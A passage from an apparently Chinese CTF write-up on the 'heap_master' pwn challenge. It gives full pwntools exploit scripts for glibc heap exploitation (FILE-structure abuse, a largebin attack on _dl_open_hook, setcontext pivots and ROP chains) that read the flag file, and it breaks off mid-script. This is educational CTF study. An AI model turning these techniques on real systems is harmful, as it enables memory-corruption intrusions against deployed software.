class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x10</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#read_end</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">free_(<span class="number">0x10</span>)</span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit_(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x20</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#write_base</span></span><br><span class="line">malloc_(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">fake = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(fake)</span><br><span class="line">addr_buf_base = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr_buf_base)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-16</span> - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.recv(<span class="number">0x838</span>)</span><br><span class="line">addr_stack= u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3</span></span><br><span class="line"><span class="keyword">print</span> hex(addr_stack)</span><br><span class="line"></span><br><span class="line">libc.address=libc_addr</span><br><span class="line">addr_libc_gets          = libc.sep_function[<span class="string">'gets'</span>]</span><br><span class="line">addr_libc_stdout        = libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">addr_libc_dl_open_hook  = libc.symbols[<span class="string">'_dl_open_hook'</span>]</span><br><span class="line">addr_libc_io_file_jumps = libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">addr_libc_io_str_jumps  = addr_libc_io_file_jumps + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>)) </span><br><span class="line">free(<span class="number">0x10</span>) <span class="comment">#free完后，fd&amp;bk-&gt;dl_open_hook</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line">edit(<span class="number">0x18</span>, p64(addr_libc_stdout+<span class="number">0x68</span><span class="number">-0x10</span>))<span class="comment"># bk-&gt;stdout+0x68(chain)</span></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x191</span>))</span><br><span class="line">edit(<span class="number">0x198</span>, p64(<span class="number">0x11</span>)) <span class="comment">#main_arena + 0x68（chain)-&gt;mmap</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fake_file  = <span class="string">'\x00'</span>*<span class="number">0x28</span></span><br><span class="line"><span class="comment"># fake_file += p64((addr_stack-0x2000 - 0x64)/2 + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_file  = fake_file.ljust(<span class="number">0x40</span>, <span class="string">'\x00'</span>)</span><br><span class="line">fake_file += p64((addr_stack <span class="number">-0x2100</span>- <span class="number">0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_file  = fake_file.ljust(<span class="number">0xd8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">fake_file += p64(addr_libc_io_str_jumps)</span><br><span class="line">fake_file += p64(addr_libc_gets)</span><br><span class="line">edit(<span class="number">0</span>, fake_file)</span><br><span class="line">gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">rop = ROP(libc)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x100</span>, <span class="string">'./flag\x00'</span>)</span><br><span class="line"></span><br><span class="line">rop.open(addr_buf_base + <span class="number">0x100</span>, <span class="number">0</span>)</span><br><span class="line">rop.read(<span class="number">3</span>, addr_buf_base + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">rop.write(constants.STDOUT_FILENO, addr_buf_base + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">print</span> hex(rop.ret.address)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'0'</span>)</span><br><span class="line">p.sendline(p64(rop.ret.address)*<span class="number">0x500</span>+str(rop))<span class="comment">#任意填充一直ret到rop的位置</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="方法二：largebin-attack-amp-dl-open-hook"><a href="#方法二：largebin-attack-amp-dl-open-hook" class="headerlink" title="方法二：largebin attack &amp; dl_open_hook"></a>方法二：largebin attack &amp; dl_open_hook</h4><p>发现它要getshell貌似一定要改glibc的版本，因为给的libc是2.25的</p><p>本来想用unsorted bin attack + global_max_fast来做的，但是发现fastbin attack的话好像就没办法把mmap的地址填进dl_open_hook达到对mmap段的利用（我太菜了</p><p>那就用largebin attack吧，方便一点</p><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><p><a href="https://ama2in9.top/2020/01/02/heap_master/" target="_blank" rel="noopener">https://ama2in9.top/2020/01/02/heap_master/</a><br><a href="https://www.lyyl.online/2020/07/14/starctf-2019-WP/" target="_blank" rel="noopener">https://www.lyyl.online/2020/07/14/starctf-2019-WP/</a><br><a href="http://pollux.cc/2019/05/04/2019-sixstarsCTF-heap_master/#0x01-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90" target="_blank" rel="noopener">http://pollux.cc/2019/05/04/2019-sixstarsCTF-heap_master/#0x01-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90</a><br><a href="https://paper.seebug.org/935/#3-largebin-attack-_dl_open_hook" target="_blank" rel="noopener">https://paper.seebug.org/935/#3-largebin-attack-_dl_open_hook</a></p><h5 id="关于dl-open-hook"><a href="#关于dl-open-hook" class="headerlink" title="关于dl_open_hook"></a>关于dl_open_hook</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc 2.23   elf/dl-libc.c : 111</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dl_open_hook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *(*dlopen_mode) (<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> mode);</span><br><span class="line">  <span class="keyword">void</span> *(*dlsym) (<span class="keyword">void</span> *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">char</span> *name);</span><br><span class="line">  <span class="keyword">int</span> (*dlclose) (<span class="keyword">void</span> *<span class="built_in">map</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们调试的时候可以发现，在报错时会把dl_open_hook里的值放进rax中（用官方的libc环境是rbx,但是我没更换到）所以要找到可利用的gadget，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7a7a99a</span> &lt;_IO_new_fgetpos+<span class="number">170</span>&gt;:   mov    rdi,rax</span><br><span class="line"><span class="number">0x7ffff7a7a99d</span> &lt;_IO_new_fgetpos+<span class="number">173</span>&gt;:    call   QWORD PTR [rax+<span class="number">0x20</span>]</span><br></pre></td></tr></table></figure><p>基本上就是rax那些指针的bug的感觉了，syscall好像call不了，不知道为啥</p><p>然后在rax(mmap段地址在执行libc_dlopen_mode的时候会被放到rax里面）+0x20的位置放setcontext+53的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7a54b85</span> &lt;setcontext+<span class="number">53</span>&gt;:mov    rsp,QWORD PTR [rdi+<span class="number">0xa0</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b8c</span> &lt;setcontext+<span class="number">60</span>&gt;:mov    rbx,QWORD PTR [rdi+<span class="number">0x80</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b93</span> &lt;setcontext+<span class="number">67</span>&gt;:mov    rbp,QWORD PTR [rdi+<span class="number">0x78</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b97</span> &lt;setcontext+<span class="number">71</span>&gt;:mov    r12,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b9b</span> &lt;setcontext+<span class="number">75</span>&gt;:mov    r13,QWORD PTR [rdi+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b9f</span> &lt;setcontext+<span class="number">79</span>&gt;:mov    r14,QWORD PTR [rdi+<span class="number">0x58</span>]</span><br><span class="line"><span class="number">0x7ffff7a54ba3</span> &lt;setcontext+<span class="number">83</span>&gt;:mov    r15,QWORD PTR [rdi+<span class="number">0x60</span>]</span><br></pre></td></tr></table></figure><p>控制rsp为我们填写rop的位置，实现rop的利用</p><p>调试exp(就是syscall会crash掉，不知道为啥)</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(off,cont)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(cont)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(off)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x108</span>,p64(<span class="number">0x401</span>))      <span class="comment">#fake first large chunk</span></span><br><span class="line">    edit(<span class="number">0x508</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x528</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x110</span>)</span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">0x608</span>,p64(<span class="number">0x411</span>))</span><br><span class="line">    edit(<span class="number">0x608</span>+<span class="number">0x410</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x608</span>+<span class="number">0x430</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x610</span>  )</span><br><span class="line">    edit(<span class="number">0x118</span>,p16(<span class="number">0x2610</span>))     <span class="comment">#modify stdout_flag --&gt; mmap_addr</span></span><br><span class="line">    edit(<span class="number">0x128</span>,p16(<span class="number">0x2629</span>))</span><br><span class="line">    <span class="comment"># delete(0x610)</span></span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">0x1008</span>,p64(<span class="number">0x451</span>))     <span class="comment">#fake second large chunk</span></span><br><span class="line">    edit(<span class="number">0x1458</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x1478</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x1010</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">0x1508</span>,p64(<span class="number">0x461</span>))</span><br><span class="line">    edit(<span class="number">0x1968</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x1988</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x1510</span>)</span><br><span class="line">    edit(<span class="number">0x1018</span>,p16(<span class="number">0x2629</span>))    <span class="comment">#modify io_write_base_one_byte --&gt; '\x00'</span></span><br><span class="line">    add(<span class="number">0x460</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    data = p.recv(<span class="number">8</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">''</span> <span class="keyword">or</span> data[<span class="number">0</span>] == <span class="string">'='</span> :</span><br><span class="line">        <span class="keyword">raise</span> NameError</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    p.recv(<span class="number">24</span>)</span><br><span class="line">    data1 = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    data2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    heap_base = data1 - <span class="number">3584</span></span><br><span class="line">    libc_base = data2 - <span class="number">3954339</span></span><br><span class="line">    setcontext = libc_base + <span class="number">293749</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_base),hex(libc_base)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2008</span>,p64(<span class="number">0x501</span>))</span><br><span class="line">    edit(<span class="number">0x2508</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x2528</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x2010</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2608</span>,p64(<span class="number">0x511</span>))</span><br><span class="line">    edit(<span class="number">0x2b18</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x2b38</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x2610</span>)</span><br><span class="line">    edit(<span class="number">0x2018</span>,p16(<span class="number">0x62d0</span>))</span><br><span class="line">    add(<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    pop_rax = libc_base + <span class="number">0x000000000003a738</span></span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">    pop_rsi = libc_base + <span class="number">0x00000000000202f8</span>  <span class="comment">#182c</span></span><br><span class="line">    pop_rdx = libc_base + <span class="number">0x0000000000001b92</span>  <span class="comment">#true</span></span><br><span class="line">    syscall = libc_base + <span class="number">0x00000000000026bf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff7a7a99a &lt;_IO_new_fgetpos+170&gt;:   mov    rdi,rax</span></span><br><span class="line">    <span class="comment"># 0x7ffff7a7a99d &lt;_IO_new_fgetpos+173&gt;:    call   QWORD PTR [rax+0x20]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2600</span>,p64(libc_base+<span class="number">0x6D99A</span>))</span><br><span class="line">    edit(<span class="number">0x2620</span>,p64(setcontext+<span class="number">0x10</span>))</span><br><span class="line">    edit(<span class="number">0x26a0</span>,p64(heap_base+<span class="number">0x26b0</span>))</span><br><span class="line">    edit(<span class="number">0x26a8</span>,p64(libc_base+<span class="number">0x0000000000000937</span>)) <span class="comment">#ret</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x26b0</span>,p64(pop_rax))    <span class="comment">#read</span></span><br><span class="line">    edit(<span class="number">0x26b8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x26c0</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x26c8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x26d0</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x26d8</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x26e0</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x26e8</span>,p64(<span class="number">20</span>))</span><br><span class="line">    edit(<span class="number">0x26f0</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x26f8</span>,p64(pop_rax))    <span class="comment">#open</span></span><br><span class="line">    edit(<span class="number">0x2700</span>,p64(<span class="number">2</span>))</span><br><span class="line">    edit(<span class="number">0x2708</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x2710</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x2718</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x2720</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x2728</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x2730</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x2738</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2740</span>,p64(pop_rax))    <span class="comment">#read</span></span><br><span class="line">    edit(<span class="number">0x2748</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x2750</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x2758</span>,p64(<span class="number">4</span>))</span><br><span class="line">    edit(<span class="number">0x2760</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x2768</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x2770</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x2778</span>,p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">0x2780</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2788</span>,p64(pop_rax))    <span class="comment">#write</span></span><br><span class="line">    edit(<span class="number">0x2790</span>,p64(<span class="number">1</span>))</span><br><span class="line">    edit(<span class="number">0x2798</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x27a0</span>,p64(<span class="number">1</span>))</span><br><span class="line">    edit(<span class="number">0x27a8</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x27b0</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x27b8</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x27c0</span>,p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">0x27c8</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0x2b20</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    delete(<span class="number">0x2b20</span>)</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'./flag\x00'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span> :</span><br><span class="line">    pd = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> pd:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line">            exp()</span><br><span class="line">            pd = <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>打得通的大佬exp(就是由于要搞glibc的更换，所以没办法在gdb里看bin那些东西)：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 